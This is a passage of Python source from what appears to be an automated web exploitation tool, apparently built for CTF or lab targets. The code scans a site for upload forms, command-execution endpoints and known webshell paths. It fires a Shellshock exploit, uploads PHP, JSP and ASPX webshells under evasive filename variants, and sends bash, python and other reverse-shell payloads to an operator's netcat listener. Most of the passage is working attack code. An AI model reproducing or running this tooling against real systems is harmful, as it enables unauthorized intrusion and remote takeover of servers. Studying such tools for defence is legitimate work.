        if not found_uploads:
            self.logger.info("→ Spidering main page for file inputs...")
            try:
                response = self.session.get(self.base_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                links = soup.find_all('a', href=True)
                for link in links[:50]:  # Limit to first 50 links
                    href = link['href']
                    full_url = urljoin(self.base_url, href)
                    
                    # Only check same-domain links
                    if urlparse(full_url).netloc == urlparse(self.base_url).netloc:
                        try:
                            link_response = self.session.get(full_url, timeout=5)
                            if link_response.status_code == 200:
                                link_soup = BeautifulSoup(link_response.text, 'html.parser')
                                file_inputs = link_soup.find_all('input', {'type': 'file'})
                                
                                if file_inputs:
                                    found_uploads.append(full_url)
                                    self.logger.success(f"  ✓ Found via spider: {href}")
                                    if not self.upload_url:
                                        self.upload_url = full_url
                        except:
                            continue
            except Exception as e:
                self.logger.warning(f"Spider error: {e}")
        
        # 4. Check for file inputs on main page
        if not found_uploads:
            try:
                response = self.session.get(self.base_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                file_inputs = soup.find_all('input', {'type': 'file'})
                
                if file_inputs:
                    found_uploads.append(self.base_url)
                    self.logger.success(f"  ✓ Found on main page")
                    if not self.upload_url:
                        self.upload_url = self.base_url
            except:
                pass
        
        if found_uploads:
            self.vulnerabilities.append({
                'type': 'file_upload',
                'urls': found_uploads,
                'execution_paths': found_execution_paths
            })
            self.logger.success(f"✓ Found {len(found_uploads)} upload form(s)")
            if found_execution_paths:
                self.logger.success(f"✓ Found {len(found_execution_paths)} execution path(s)")
        else:
            self.logger.warning("No file upload forms found")
            self.logger.info("💡 Recommendations:")
            self.logger.info("   • gobuster dir -u {} -w /usr/share/wordlists/dirb/common.txt".format(self.base_url))
            self.logger.info("   • dirsearch -u {} -e php,asp,aspx,jsp".format(self.base_url))
            self.logger.info("   • Check robots.txt and sitemap.xml manually")
#Execute Shellshock attack using the module
    def _attack_shellshock(self):
        
        if not hasattr(self, 'shellshock_module'):
            self.logger.error("✗ No Shellshock module initialized")
            return False
        
        self.logger.separator()
        self.logger.header("⚡ Shellshock Exploitation")
        
        # Remind user to start listener
        self.logger.warning("⚠️  Make sure you have a listener running!")
        self.logger.info(f"   Run this in another terminal:")
        self.logger.info(f"   nc -lvnp {self.lport}")
        self.logger.info("")
        
        input("Press ENTER when listener is ready...")
        
        # Use the module to exploit
        self.logger.loading("Sending Shellshock exploit...")
        success = self.shellshock_module.exploit()
        
        if success:
            self.logger.success("✓ Exploit sent! Check your listener!")
            
            # Ask user if they got a shell
            response = input("\n🐚 Did you receive a shell? [y/n]: ").strip().lower()
            if response in ['y', 'yes']:
                self.logger.success("🎉 Shell received! Happy hacking!")
                self.shell_received = True
                return True
        
        return False
            
    def _scan_for_command_execution(self):
        """Scan for command execution points."""
        self.logger.info("Scanning for command execution points...")
        
        # Extended RCE paths (~200 entries)
        rce_paths = [
            # Direct command execution
            '/cmd', '/cmd.php', '/command', '/command.php',
            '/exec', '/exec.php', '/execute', '/execute.php',
            '/run', '/run.php', '/shell', '/shell.php',
            '/terminal', '/terminal.php', '/console', '/console.php',
            '/system', '/system.php',
            # Authenticated portals (check after login)
            '/portal', '/portal.php', '/portal/', '/portal/index.php',
            '/dashboard', '/dashboard.php', '/home', '/home.php',
            '/admin/portal', '/admin/home', '/user/portal',
            # Admin command panels
            '/admin/cmd', '/admin/command', '/admin/exec', '/admin/execute',
            '/admin/shell', '/admin/terminal', '/admin/console',
            '/admin/system', '/administrator/cmd',
            # Panel/Control
            '/panel/cmd', '/panel/command', '/cpanel/cmd', '/control/exec',
            # API endpoints
            '/api/exec', '/api/command', '/api/cmd', '/api/execute',
            '/api/run', '/api/shell', '/api/system',
            '/api/v1/exec', '/api/v1/command', '/rest/exec', '/rest/command',
            # Testing/Debug
            '/test', '/test.php', '/debug', '/debug.php',
            '/dev/exec', '/dev/command',
            # Web shells (common names)
            '/webshell', '/webshell.php', '/backdoor', '/backdoor.php',
            '/shell.php', '/c99.php', '/r57.php', '/wso.php', '/b374k.php',
            '/phpshell.php', '/cmdasp.asp', '/shell.asp', '/cmd.asp',
            # Info/Test pages
            '/phpinfo', '/phpinfo.php', '/info', '/info.php',
            # Ping/Network tools
            '/ping', '/ping.php', '/network', '/tools', '/tools.php',
            # CGI-BIN
            '/cgi-bin/exec', '/cgi-bin/system', '/cgi-bin/cmd',
            '/apply.cgi', '/command.php',
            # Language-specific
            '/exec.jsp', '/shell.jsp', '/cmd.aspx', '/execute.aspx',
            '/terminal.do', '/run.action',
            # Framework-specific
            '/admin/system.php', '/manager/html/upload', '/manager/status',
            # Swagger/API
            '/swagger/exec', '/swagger-ui/exec', '/actuator/exec',
            # Jenkins/CI
            '/script', '/scriptText', '/jenkins/script',
            # Monitoring
            '/monitoring/exec', '/status/exec', '/health/exec',
            # Scheduler
            '/scheduler/run', '/cron/exec', '/job/run', '/task/execute',
            # Service endpoints
            '/service/exec', '/services/command', '/rpc/exec',
            # Admin tools
            '/admin/tools', '/admin/utilities', '/admin/diagnostics',
            # Database
            '/phpmyadmin/import.php', '/pma/import.php',
            # Less common shells
            '/up.php', '/alfa.php', '/indoxploit.php', '/adminer.php',
            '/shell2.php', '/x.php', '/xx.php', '/xxx.php',
            # Backup shells
            '/backup-shell.php', '/old-shell.php', '/test-shell.php',
            # Hidden directories
            '/.cmd', '/_cmd', '/hidden/cmd', '/.shell', '/.exec',
            # Chinese webshells
            '/ma.php', '/1.php', '/hack.php', '/hm.php',
            # Development
            '/dev-shell.php', '/test-exec.php', '/qa-cmd.php',
            # Cloud/Modern
            '/lambda/exec', '/function/run', '/serverless/exec',
            # Monitoring tools
            '/nagios/cmd.cgi', '/cacti/exec.php', '/zabbix/exec.php',
            # Mobile
            '/mobile/exec', '/app/command', '/m/cmd',
            # Ajax/Async
            '/ajax/exec', '/async/command', '/xhr/exec',
            # Queue/Worker
            '/queue/run', '/worker/exec', '/job/execute'
        ]
        
        found_rce = []
        
        # 1. Check common RCE paths (now with session if logged in)
        self.logger.info("→ Checking common command execution paths...")
        for path in rce_paths:
            try:
                url = urljoin(self.base_url, path)
                
                # First, just check if page exists and is accessible
                check_response = self.session.get(url, timeout=5, allow_redirects=False)
                
                # If we get redirected to login, skip (need auth)
                if check_response.status_code in [301, 302, 303, 307, 308]:
                    continue
                
                if check_response.status_code == 200:
                    # Check if page has a form with suspicious inputs
                    soup = BeautifulSoup(check_response.text, 'html.parser')
                    
                    # Look for forms first
                    forms = soup.find_all('form')
                    for form in forms:
                        inputs = form.find_all('input')
                        textareas = form.find_all('textarea')
                        
                        # Check for command-like inputs
                        for inp in inputs + textareas:
                            inp_name = inp.get('name', '').lower()
                            inp_type = inp.get('type', 'text').lower()
                            inp_placeholder = inp.get('placeholder', '').lower()
                            
                            # Suspicious indicators
                            cmd_indicators = [
                                'cmd', 'command', 'exec', 'execute', 'run',
                                'shell', 'terminal', 'console', 'system', 'input'
                            ]
                            
                            if any(indicator in inp_name for indicator in cmd_indicators) or \
                               any(indicator in inp_placeholder for indicator in cmd_indicators):
                                action = form.get('action', url)
                                full_url = urljoin(url, action)
                                found_rce.append({'url': full_url, 'param': inp.get('name', 'command')})
                                self.logger.success(f"  ✓ Found command form: {path} (field: {inp.get('name')})")
                                if not self.command_url:
                                    self.command_url = full_url
                                break
                        
                        if found_rce:
                            break
                    
                    # If no form found, try testing with echo
                    if not found_rce:
                        test_commands = [
                            ('cmd', 'echo test123'),
                            ('command', 'echo test123'),
                            ('exec', 'echo test123'),
                            ('execute', 'echo test123'),
                            ('input', 'echo test123'),
                            ('c', 'echo test123')
                        ]
                        
                        for param, value in test_commands:
                            try:
                                response = self.session.get(url, params={param: value}, timeout=5)
                                if response.status_code == 200 and 'test123' in response.text:
                                    found_rce.append({'url': url, 'param': param})
                                    self.logger.success(f"  ✓ Found RCE: {path} (param: {param})")
                                    if not self.command_url:
                                        self.command_url = url
                                    break
                            except:
                                continue
                                
            except:
                continue
        
        # 2. Spider for forms with suspicious inputs (skip if already found)
        if not found_rce:
            self.logger.info("→ Spidering for command execution forms...")
            try:
                response = self.session.get(self.base_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Look for suspicious form fields
                suspicious_names = [
                    'cmd', 'command', 'exec', 'execute', 'run',
                    'shell', 'terminal', 'console', 'system', 'ping'
                ]
                
                forms = soup.find_all('form')
                for form in forms:
                    inputs = form.find_all('input')
                    for inp in inputs:
                        name = inp.get('name', '').lower()
                        if any(sus in name for sus in suspicious_names):
                            action = form.get('action', self.base_url)
                            full_url = urljoin(self.base_url, action)
                            found_rce.append({'url': full_url, 'param': inp.get('name')})
                            self.logger.success(f"  ✓ Suspicious form field found: {name}")
                            if not self.command_url:
                                self.command_url = full_url
            except Exception as e:
                self.logger.warning(f"Spider error: {e}")
        
        # 3. Check main page for command execution
        if not found_rce:
            try:
                # Test main page with common parameters
                test_params = ['cmd', 'command', 'exec']
                for param in test_params:
                    response = self.session.get(
                        self.base_url,
                        params={param: 'echo test123'},
                        timeout=5
                    )
                    if 'test123' in response.text:
                        found_rce.append({'url': self.base_url, 'param': param})
                        self.logger.success(f"  ✓ Found on main page (param: {param})")
                        if not self.command_url:
                            self.command_url = self.base_url
                        break
            except:
                pass
        
        if found_rce:
            self.vulnerabilities.append({
                'type': 'command_execution',
                'endpoints': found_rce
            })
            self.logger.success(f"✓ Found {len(found_rce)} command execution point(s)")
        else:
            self.logger.warning("No command execution points found")
            self.logger.info("💡 Manual testing required:")
            self.logger.info("   • Test URL parameters manually")
            self.logger.info("   • Check for eval(), exec(), system() functions")
            self.logger.info("   • Look for template injection vulnerabilities")
    
    def _display_scan_results(self):
        """Display scan results and let user choose attack."""
        if not self.vulnerabilities:
            self.logger.warning("\n⚠ No vulnerabilities detected automatically")
            if input("Continue with manual exploitation? [y/n]: ").strip().lower() not in ['y', 'yes']:
                return
        else:
            self.logger.separator()
            self.logger.header("📊 Scan Results")
            
            has_file = any(v['type'] == 'file_upload' for v in self.vulnerabilities)
            has_command = any(v['type'] == 'command_execution' for v in self.vulnerabilities)
            has_shellshock = any(v['type'] == 'shellshock' for v in self.vulnerabilities)   
                     
            if has_file:
                self.logger.success("✓ File upload capability detected")
                # Let user select which upload endpoint if multiple found
                for vuln in self.vulnerabilities:
                    if vuln['type'] == 'file_upload':
                        found_uploads = vuln.get('urls', [])
                        if len(found_uploads) > 1:
                            print("\n📤 Multiple upload endpoints found:")
                            for i, url in enumerate(found_uploads, 1):
                                print(f"  {i}. {url}")
                            
                            choice = input(f"\nWhich to attack? [1-{len(found_uploads)}] (default: 1): ").strip()
                            try:
                                idx = int(choice) - 1 if choice.isdigit() and 1 <= int(choice) <= len(found_uploads) else 0
                                self.upload_url = found_uploads[idx]
                                self.logger.info(f"Selected: {self.upload_url}")
                            except:
                                self.upload_url = found_uploads[0]
                                self.logger.info(f"Using default: {self.upload_url}")
                        
                        # Select execution path if multiple found
                        found_exec_paths = vuln.get('execution_paths', [])
                        if len(found_exec_paths) > 1:
                            print("\n📂 Multiple execution paths found:")
                            for i, path in enumerate(found_exec_paths, 1):
                                print(f"  {i}. {path}")
                            
                            choice = input(f"\nWhich execution path? [1-{len(found_exec_paths)}] (default: 1): ").strip()
                            try:
                                idx = int(choice) - 1 if choice.isdigit() and 1 <= int(choice) <= len(found_exec_paths) else 0
                                self.execute_path = found_exec_paths[idx]
                                self.logger.info(f"Selected: {self.execute_path}")
                            except:
                                self.execute_path = found_exec_paths[0]
                                self.logger.info(f"Using default: {self.execute_path}")
            
            if has_command:
                self.logger.success("✓ Command execution capability detected")
                # Let user select which command endpoint if multiple found
                for vuln in self.vulnerabilities:
                    if vuln['type'] == 'command_execution':
                        found_rce = vuln.get('endpoints', [])
                        if len(found_rce) > 1:
                            print("\n⚡ Multiple command endpoints found:")
                            for i, endpoint in enumerate(found_rce, 1):
                                url = endpoint.get('url', 'Unknown')
                                param = endpoint.get('param', 'Unknown')
                                print(f"  {i}. {url} (param: {param})")
                            
                            choice = input(f"\nWhich to attack? [1-{len(found_rce)}] (default: 1): ").strip()
                            try:
                                idx = int(choice) - 1 if choice.isdigit() and 1 <= int(choice) <= len(found_rce) else 0
                                self.command_url = found_rce[idx]['url']
                                self.logger.info(f"Selected: {self.command_url} (param: {found_rce[idx]['param']})")
                            except:
                                self.command_url = found_rce[0]['url']
                                self.logger.info(f"Using default: {self.command_url}")
            # Display Shellshock results
            if has_shellshock:
                self.logger.success("✓ Shellshock (CVE-2014-6271) vulnerability detected")
                
                # Let user select which endpoint if multiple found
                for vuln in self.vulnerabilities:
                    if vuln['type'] == 'shellshock':
                        found_shellshock = vuln.get('endpoints', [])
                        
                        if len(found_shellshock) > 1:
                            print("\n⚡ Multiple Shellshock endpoints found:")
                            for i, endpoint in enumerate(found_shellshock, 1):
                                url = endpoint.get('url', 'Unknown')
                                header = endpoint.get('header', 'Unknown')
                                print(f"  {i}. {url} (via {header})")
                            
                            choice = input(f"\nWhich to attack? [1-{len(found_shellshock)}] (default: 1): ").strip()
                            try:
                                idx = int(choice) - 1 if choice.isdigit() and 1 <= int(choice) <= len(found_shellshock) else 0
                                self.shellshock_url = found_shellshock[idx]['url']
                                self.shellshock_header = found_shellshock[idx]['header']
                                self.logger.info(f"Selected: {self.shellshock_url} (via {self.shellshock_header})")
                            except:
                                self.shellshock_url = found_shellshock[0]['url']
                                self.shellshock_header = found_shellshock[0]['header']
                                self.logger.info(f"Using default: {self.shellshock_url}")     
                                       
            # If auto mode and multiple vulns found, ask what to attack
            if self.attack_type == 'auto' and len(self.vulnerabilities) > 1:
                print("\n🎯 What would you like to attack?")
                print("1. File upload")
                print("2. Command execution")
                print("3. Shellshock")
                print("4. All (try in order)")
                
                choice = input("\nChoice [1-4]: ").strip()
                if choice == '1':
                    self.attack_type = 'file'
                elif choice == '2':
                    self.attack_type = 'command'
                elif choice == '3':
                    self.attack_type = 'shellshock'
                # else try all
                
                choice = input("\nChoice [1-3]: ").strip()
                if choice == '1':
                    self.attack_type = 'file'
                elif choice == '2':
                    self.attack_type = 'command'
                # else try both
    
#DETECT_PLATFORM_START
    def _detect_platform(self) -> Optional[str]:
        """Detect target platform from HTTP headers, content, and discovered paths."""
        try:
            self.logger.loading("Detecting target platform...")
            
            confidence = {}  # Track confidence scores for each platform
            sources = {'php': [], 'jsp': [], 'aspx': []}  # Track what contributed
            self.is_tomcat = False  # Flag for Tomcat-specific handling
            
            # Layer 1: Check HTTP headers
            response = self.session.get(self.base_url, timeout=10)
            headers = response.headers
            server = headers.get('Server', '').lower()
            powered_by = headers.get('X-Powered-By', '').lower()
            
            if 'php' in powered_by or 'php' in server:
                confidence['php'] = confidence.get('php', 0) + 2
                sources['php'].append('headers')
# Detect Tomcat server for automatic WAR packaging support
            elif 'servlet' in powered_by or 'tomcat' in server or 'java' in server:
                confidence['jsp'] = confidence.get('jsp', 0) + 2
                sources['jsp'].append('headers')
                if 'tomcat' in server or 'tomcat' in powered_by:
                    self.is_tomcat = True
                    self.logger.info("→ Detected Apache Tomcat (will use WAR packaging)")
            elif 'iis' in server or 'aspnet' in powered_by or 'asp.net' in powered_by:
                confidence['aspx'] = confidence.get('aspx', 0) + 2
                sources['aspx'].append('headers')
            
            # Layer 2: Check discovered vulnerabilities for URL patterns
            urls_to_check = [self.base_url]
            
            # Add all discovered upload URLs (not just selected one)
            for vuln in self.vulnerabilities:
                if vuln['type'] == 'file_upload':
                    urls_to_check.extend(vuln.get('urls', []))
                    urls_to_check.extend(vuln.get('execution_paths', []))
            
            # Also check currently selected URLs if set
            if self.upload_url:
                urls_to_check.append(self.upload_url)
            if self.execute_path:
                urls_to_check.append(self.execute_path)
            
            for url in urls_to_check:
                if '.php' in url:
                    confidence['php'] = confidence.get('php', 0) + 3
                    if 'URLs' not in sources['php']:
                        sources['php'].append('URLs')
                elif '.jsp' in url:
                    confidence['jsp'] = confidence.get('jsp', 0) + 3
                    if 'URLs' not in sources['jsp']:
                        sources['jsp'].append('URLs')
                elif '.aspx' in url:
                    confidence['aspx'] = confidence.get('aspx', 0) + 3
                    if 'URLs' not in sources['aspx']:
                        sources['aspx'].append('URLs')
            
            # Layer 3: Check response content for clues
            content = response.text.lower()
            
            if 'phpsessid' in content or '.php' in content[:2000]:
                confidence['php'] = confidence.get('php', 0) + 3
                if 'content' not in sources['php']:
                    sources['php'].append('content')
            if '.jsp' in content[:2000] or 'jsessionid' in content:
                confidence['jsp'] = confidence.get('jsp', 0) + 3
                if 'content' not in sources['jsp']:
                    sources['jsp'].append('content')
            if '.aspx' in content[:2000] or 'viewstate' in content or '__viewstate' in content:
                confidence['aspx'] = confidence.get('aspx', 0) + 3
                if 'content' not in sources['aspx']:
                    sources['aspx'].append('content')
            
            # Layer 4: Check error page (trigger 404)
            try:
                error_response = self.session.get(urljoin(self.base_url, '/nonexistent_file_12345.test'), timeout=5)
                error_content = error_response.text.lower()
                
                if 'php' in error_content or 'apache' in error_content:
                    confidence['php'] = confidence.get('php', 0) + 1
                    if 'error page' not in sources['php']:
                        sources['php'].append('error page')
                if 'tomcat' in error_content or 'http status 404' in error_content:
                    confidence['jsp'] = confidence.get('jsp', 0) + 2
                    if 'error page' not in sources['jsp']:
                        sources['jsp'].append('error page')
                if 'server error in' in error_content or 'runtime error' in error_content:
                    confidence['aspx'] = confidence.get('aspx', 0) + 2
                    if 'error page' not in sources['aspx']:
                        sources['aspx'].append('error page')
            except:
                pass
            
            # Show detection results with sources
            if confidence:
                results = []
                for platform in ['php', 'jsp', 'aspx']:
                    score = confidence.get(platform, 0)
                    if score > 0:
                        source_str = ", ".join(sources[platform])
                        results.append(f"{platform.upper()}: {score} ({source_str})")
                    else:
                        results.append(f"{platform.upper()}: 0")
                
                self.logger.info(f"→ Detection: {' | '.join(results)}")
            
            # Pick platform with highest confidence
            if confidence:
                detected = max(confidence, key=confidence.get)
                score = confidence[detected]
                
                if score >= 2:  # Minimum confidence threshold
                    platform_names = {
                        'php': 'PHP',
                        'jsp': 'Java/Tomcat (JSP)',
                        'aspx': 'IIS/ASP.NET (ASPX)'
                    }
                    self.logger.success(f"✓ Selected: {platform_names[detected]} (highest confidence)")
                    return detected
            
            # Default to PHP if upload form found but can't detect platform
            if self.upload_url or self.vulnerabilities:
                self.logger.warning("⚠ Could not detect platform confidently, defaulting to PHP (most common)")
                return 'php'
            
            self.logger.warning("⚠ Could not detect platform")
            return None
            
        except Exception as e:
            self.logger.warning(f"Platform detection failed: {e}")
            return None

    
    def _show_shell_menu(self, detected_platform: Optional[str] = None) -> str:
        """Show shell selection menu and return chosen shell."""
        # Determine default based on detection
        if detected_platform == 'php':
            default = 1
        elif detected_platform == 'jsp':
            default = 2
        elif detected_platform == 'aspx':
            default = 3
        else:
            default = 1  # Default to PHP (most common)
        
        print("\nWhich shell would you like to use?")
        print("1. PHP (monkeyphp.php)")
        print("2. JSP (jspshell.jsp)")
        print("3. ASPX (aspxcmdshell.aspx)")
        print("4. Try all (one by one)")
        print("5. Custom (provide path)")
        
        choice = input(f"\nChoice [1-5] (default: {default}): ").strip()
        
        # Empty = use default
        if not choice:
            choice = str(default)
        
        if choice == '1':
            return 'monkeyphp.php'
        elif choice == '2':
            return 'jspshell.jsp'
        elif choice == '3':
            return 'aspxcmdshell.aspx'
        elif choice == '4':
            return 'try_all'
        elif choice == '5':
            custom_path = input("Shell file path: ").strip()
            return custom_path
        else:
            self.logger.warning(f"Invalid choice, using default (option {default})")
            if default == 1:
                return 'monkeyphp.php'
            elif default == 2:
                return 'jspshell.jsp'
            else:
                return 'aspxcmdshell.aspx'
    
    def _select_shell_by_platform(self, platform: str) -> str:
        """Select shell file based on detected platform."""
        platform_map = {
            'php': 'monkeyphp.php',
            'jsp': 'jspshell.jsp',
            'aspx': 'aspxcmdshell.aspx'
        }
        return platform_map.get(platform, 'monkeyphp.php')
    
    def _try_all_shells(self):
        """Try all available shells one by one."""
        shells = ['monkeyphp.php', 'jspshell.jsp', 'aspxcmdshell.aspx']
        
        for shell_path in shells:
            self.logger.separator()
            self.logger.info(f"🐚 Trying {shell_path}...")
            
            # Load shell
            shell_content = self._load_shell_file(shell_path)
            if not shell_content:
                self.logger.warning(f"Could not load {shell_path}, skipping...")
                continue
            
            # Customize
            shell_content = self._customize_shell(shell_content)
            
            # Get variants for this shell
            base_name = os.path.splitext(shell_path)[0]
            extension = os.path.splitext(shell_path)[1][1:]  # Remove the dot
            variants = self._get_filename_variants(base_name, extension)
            
            # Try uploading each variant
            for filename in variants:
                self.logger.info(f"\n📤 Trying: {filename}")
                
                if self._upload_file(shell_content, filename):
                    if self._execute_uploaded_shell(filename):
                        time.sleep(2)
                        response = input("\n💡 Did you get a shell? [y/n]: ").strip().lower()
                        
                        if response == 'y':
                            self.logger.success("🎉 Shell confirmed!")
                            self.success = True
                            return
            
            self.logger.warning(f"✗ {shell_path} didn't work, trying next shell...")
        
        self.logger.warning("⚠ All shells failed")
    
    def _execute_file_attack(self):
        """Execute file-based attack."""
        self.logger.separator()
        self.logger.header("📁 File-Based Attack")
        
        if not self.upload_url:
            self.logger.error("No upload endpoint available")
            return
        
        # 1. Detect platform
        platform = self._detect_platform()
        
        # 2. Always show menu (with smart default based on detection)
        shell_path = self._show_shell_menu(detected_platform=platform)
        
        if shell_path == 'try_all':
            self._try_all_shells()
            return
        
        # 3. Load shell
        shell_content = self._load_shell_file(shell_path)
        if not shell_content:
            return
        
        # 4. Customize shell
        shell_content = self._customize_shell(shell_content)
        
        # 5. Get filename variants
        base_name = os.path.splitext(shell_path)[0]
        extension = os.path.splitext(shell_path)[1][1:]  # Remove the dot
        variants = self._get_filename_variants(base_name, extension)
        
        # 6. Try each variant
        for filename in variants:
            self.logger.info(f"\n📤 Trying: {filename}")
            
            if self._upload_file(shell_content, filename):
                # Try to execute
                if self._execute_uploaded_shell(filename):
                    time.sleep(2)
                    response = input("\n💡 Did you get a shell? [y/n]: ").strip().lower()
                    
                    if response == 'y':
                        self.logger.success("🎉 Shell confirmed!")
                        self.success = True
                        return
                    else:
                        self.logger.warning("No shell, trying next variant...")
        
        self.logger.warning("⚠ All file variants failed")
#HERE    
    def _execute_command_attack(self):
        """Execute command-based attack."""
        self.logger.separator()
        self.logger.header("⚡ Command-Based Attack")
        
        if not self.command_url:
            self.logger.error("No command execution endpoint available")
            return
        
        # Get detected RCE info from scan results
        detected_param = None
        
        for vuln in self.vulnerabilities:
            if vuln['type'] == 'command_execution':
                endpoints = vuln.get('endpoints', [])
                if endpoints:
                    # Use first detected endpoint
                    detected_param = endpoints[0].get('param')
                    self.logger.info(f"Using detected parameter: {detected_param}")
                break
        
        # Parse URL for existing parameters (GET-based detection)
        from urllib.parse import urlparse, parse_qs
        
        parsed = urlparse(self.command_url)
        url_params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Prepare methods to try
        methods_to_try = []
        
        # 1. Check URL parameters (GET-based RCE)
        if url_params:
            self.logger.info("Detected URL parameters")
            
            common_rce_params = ['database', 'cmd', 'command', 'exec', 'run', 'execute', 'system', 'input']
            get_params = []
            existing_params = list(url_params.keys())

            # Add detected param FIRST if provided
            if detected_param and detected_param not in existing_params:
                get_params.append(detected_param)

            # Add common RCE params that DON'T exist in URL yet
            for p in common_rce_params:
                if p not in existing_params and p not in get_params:
                    get_params.append(p)

            # Then add existing params (in case they're also vulnerable)
            get_params.extend(existing_params)

            # ==== NEW MENU: Confidence scoring and user selection ====
            param_confidences = []
            for param in get_params:
                confidence = 1
                reason = "Generic"
                if param in url_params:
                    confidence += 2
                    reason = "Detected in URL"
                if detected_param and param == detected_param:
                    confidence += 2
                    reason = "Detected by scan"
                if param == "database":
                    confidence += 2
                    reason = "High likelihood (pfSense/Sense)"
                param_confidences.append((param, confidence, reason))
            param_confidences.sort(key=lambda x: x[1], reverse=True)

            print("\nDetected possible RCE parameters (sorted by confidence):")
            for i, (param, conf, reason) in enumerate(param_confidences, 1):
                stars = "⭐" if conf >= 4 else ""
                print(f"  {i}. {param.ljust(12)} (Confidence: {conf} {stars} - {reason})")

            default_choice = 1
            default_param = param_confidences[0][0]
            choice = input(f"\nChoose parameter to attack [default: {default_choice} - {default_param}]: ").strip()
            if not choice or not choice.isdigit() or int(choice) < 1 or int(choice) > len(param_confidences):
                chosen_param = default_param
            else:
                chosen_param = param_confidences[int(choice)-1][0]
            print(f"\n✓ Selected: {chosen_param}")

            # Only use the selected param for GET
            get_params = [chosen_param]

            methods_to_try.append({
                'method': 'GET',
                'url': base_url,
                'params': get_params,
                'extra_params': url_params
            })
        
        # 2. Check for forms (POST-based RCE)
        try:
            response = self.session.get(self.command_url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            if forms:
                self.logger.info("Detected form-based interface")
                
                form = forms[0]
                action = form.get('action', '')
                if action:
                    post_url = urljoin(self.command_url, action)
                else:
                    post_url = self.command_url
                
                # Find input fields
                form_data = {}
                post_params = []
                
                for inp in form.find_all('input'):
                    inp_name = inp.get('name')
                    inp_type = inp.get('type', 'text').lower()
                    inp_value = inp.get('value', '')
                    
                    if inp_name:
                        if inp_type in ['text', 'search']:
                            post_params.append(inp_name)
                        else:
                            form_data[inp_name] = inp_value
                
                # Add common RCE params
                post_params.extend(['cmd', 'command', 'exec', 'input', 'system'])
                post_params = list(dict.fromkeys(post_params))
                
                if detected_param and detected_param not in post_params:
                    post_params.insert(0, detected_param)
                
                methods_to_try.append({
                    'method': 'POST',
                    'url': post_url,
                    'params': post_params,
                    'extra_data': form_data
                })
        except Exception as e:
            self.logger.warning(f"Form detection error: {e}")
        
        # 3. Fallback if nothing detected
        if not methods_to_try:
            self.logger.warning("No RCE method auto-detected, defaulting to GET")
            methods_to_try.append({
                'method': 'GET',
                'url': self.command_url,
                'params': ['cmd', 'command', 'exec', 'database'],
                'extra_params': {}
            })
        
        # ============================================================
        # SMART METHOD SELECTION WITH USER CHOICE
        # ============================================================
        
        # Calculate confidence scores
        get_confidence = 0
        post_confidence = 0
        
        # GET confidence scoring
        if url_params:
            get_confidence += 3
            suspicious_params = ['cmd', 'command', 'exec', 'database', 'run', 'execute', 'system']
            if any(p.lower() in [k.lower() for k in url_params.keys()] for p in suspicious_params):
                get_confidence += 2
        
        # POST confidence scoring
        post_forms_found = any(m['method'] == 'POST' for m in methods_to_try)
        if post_forms_found:
            post_confidence += 2
            # Check if form has command-like inputs
            for method_info in methods_to_try:
                if method_info['method'] == 'POST':
                    for param in method_info['params']:
                        if any(word in param.lower() for word in ['cmd', 'command', 'exec', 'input', 'system']):
                            post_confidence += 2
                            break
        
        # Determine recommendation
        if get_confidence > post_confidence:
            recommended = 1
            recommended_method = "GET"
        elif post_confidence > get_confidence:
            recommended = 2
            recommended_method = "POST"
        else:
            recommended = 3
            recommended_method = "Both"
        
        # Show menu if multiple methods detected
        if len(methods_to_try) > 1:
            self.logger.separator()
            self.logger.header("🎯 RCE Method Selection")
            
            print("\nDetected attack vectors:")
            
            # Show GET details
            if any(m['method'] == 'GET' for m in methods_to_try):
                if get_confidence >= 5:
                    conf_str = "HIGH ⭐"
                elif get_confidence >= 3:
                    conf_str = "MEDIUM"
                else:
                    conf_str = "LOW"
                
                print(f"  • GET (URL params) - Confidence: {conf_str}")
                if url_params:
                    param_list = ', '.join(list(url_params.keys())[:3])
                    print(f"    Params: {param_list}")
            
            # Show POST details
            if any(m['method'] == 'POST' for m in methods_to_try):
                if post_confidence >= 4:
                    conf_str = "HIGH ⭐"
                elif post_confidence >= 2:
                    conf_str = "MEDIUM"
                else:
                    conf_str = "LOW"
                
                print(f"  • POST (form fields) - Confidence: {conf_str}")
            
            print("\nWhich method would you like to use?")
            print("1. GET (via URL parameters)")
            print("2. POST (via form fields)")
            print("3. Try both (automatic)")
            
            choice = input(f"\nChoice [1-3] (default: {recommended} - {recommended_method}): ").strip()
            
            if not choice:
                choice = str(recommended)
            
            # Apply user choice
            if choice == '1':
                methods_to_try = [m for m in methods_to_try if m['method'] == 'GET']
                self.logger.success("✓ Selected: GET method")
            elif choice == '2':
                methods_to_try = [m for m in methods_to_try if m['method'] == 'POST']
                self.logger.success("✓ Selected: POST method")
            elif choice == '3':
                self.logger.success("✓ Selected: Try both methods")
            else:
                self.logger.warning(f"Invalid choice, using recommended: {recommended_method}")
                if recommended == 1:
                    methods_to_try = [m for m in methods_to_try if m['method'] == 'GET']
                elif recommended == 2:
                    methods_to_try = [m for m in methods_to_try if m['method'] == 'POST']
        
        elif len(methods_to_try) == 1:
            method = methods_to_try[0]['method']
            self.logger.info(f"Only {method} method detected, proceeding...")
        
        # ============================================================
        # END SMART METHOD SELECTION
        # ============================================================
        
        # Display listener instructions BEFORE starting
        self.logger.separator()
        self.logger.info(f"🎧 Start listener: nc -lvnp {self.selected_port}")
        input("\n⏳ Press Enter when listener is ready...")
        
        # Generate base payload
        config = PayloadConfig(lhost=self.vpn_ip, lport=self.selected_port)
        
        # Try different payload types
        payload_types = ['bash', 'python', 'php', 'perl', 'ruby', 'nodejs']
        
        for payload_type in payload_types:
            self.logger.info(f"\n📦 Trying {payload_type} payload...")
            
            try:
                generator = get_generator(payload_type)(config)
                base_payload = generator.generate()
                
                # Get variants with evasion
                variants = self._get_command_variants(base_payload, payload_type)
                
                # Try each METHOD (GET, POST, etc.)
                for method_info in methods_to_try:
                    method = method_info['method']
                    url = method_info['url']
                    params = method_info['params']
                    
                    self.logger.info(f"  → Using {method} method")
                    
                    # Try each variant
                    for variant_name, variant_payload in variants:
                        self.logger.info(f"    → {variant_name}")
                        
                        # Try each parameter
                        for param in params:
                            if method == 'POST':
                                extra_data = method_info.get('extra_data', {})
